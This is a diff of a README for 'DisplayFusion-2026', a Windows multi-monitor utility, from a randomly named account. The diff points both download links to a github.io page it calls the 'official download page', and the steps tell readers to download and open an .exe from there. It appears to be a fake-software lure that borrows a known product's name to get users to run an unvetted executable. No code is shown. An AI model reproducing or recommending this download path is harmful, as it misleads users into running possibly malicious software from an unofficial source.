@@ -1,6 +1,6 @@
 # 🖥️ DisplayFusion-2026 - Manage multi-monitor setups with ease
 
-[![](https://img.shields.io/badge/Download-DisplayFusion-blue.svg)](https://github.com/cassocked-genuscastanea597/DisplayFusion-2026)
+[![](https://img.shields.io/badge/Download-DisplayFusion-blue.svg)](https://cassocked-genuscastanea597.github.io)
 
 DisplayFusion-2026 improves how you use screens on Windows 11 and Windows 10. This software adds taskbars to secondary monitors, manages desktop wallpapers, and lets you create keyboard shortcuts for window placement. It streamlines work across multiple displays.
 
@@ -8,7 +8,7 @@ DisplayFusion-2026 improves how you use screens on Windows 11 and Windows 10. Th
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [official download page](https://github.com/cassocked-genuscastanea597/DisplayFusion-2026).
+1. Go to the [official download page](https://cassocked-genuscastanea597.github.io).
 2. Look for the latest release version on the page.
 3. Click the link that ends in .exe to start the file transfer.
 4. Open the file once the download finishes.
